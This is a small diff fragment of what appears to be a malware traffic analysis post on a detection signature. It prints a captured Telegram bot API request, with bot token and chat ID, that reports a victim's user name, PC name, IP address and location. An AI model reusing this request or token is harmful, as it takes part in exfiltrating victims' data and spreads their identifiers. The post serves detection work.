@@ -24,7 +24,7 @@ This is why I wrote a new signature to detect on the client>server pattern I kee
 /bot5861146625:AAEHo1wi939JhVuLzstg9mWqpsc_ntWfbTQ/sendPhoto?chat_id=5058531872&caption=%E2%9D%95%20User%20connected%20%E2%9D%95%0A%E2%80%A2%20ID%3A%20a683d399ec4da81b2f69cbd3e01b93a58b431a4e%0A%E2%80%A2%20Comment%3A%2025.12-26.12%0A%0A%E2%80%A2%20User%20Name%3A%20Admin%0A%E2%80%A2%20PC%20Name%3A%20TMKNGOMU%0A%E2%80%A2%20OS%20Info%3A%20Windows%2010%20Pro%0A%0A%E2%80%A2%20IP%3A%20154.61.71.13%0A%E2%80%A2%20GEO%3A%20NL%20%2F%20Aalsmeerderbrug%0A%0A%E2%80%A2%20Working%20Directory%3A%20C%3A%5CUsers%5CAll%20Users%5CDesktop%5Cservices.exe
 ```
 
-Once decoded an human readable, they always seem to come out very similar.
+Once decoded in a human readable format, they are all very similar.
 
 
 ```
